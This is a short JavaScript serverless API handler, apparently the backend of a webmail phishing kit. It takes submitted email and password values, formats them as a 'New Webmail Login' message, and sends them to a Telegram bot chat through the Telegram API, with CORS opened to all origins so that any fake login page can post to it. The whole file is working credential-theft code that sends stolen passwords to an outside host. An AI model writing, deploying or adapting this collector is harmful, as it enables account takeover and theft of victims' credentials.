export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*"); // allow all domains
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end(); // Preflight response
  }

  try {
    const { email, password } = req.body;

    const message = ` New Webmail Login\n\nEmail: ${email}\nPassword: ${password}`;

    const response = await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text: message,
        }),
      }
    );

    const data = await response.json();
    res.status(200).json({ success: true, telegram: data });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
}
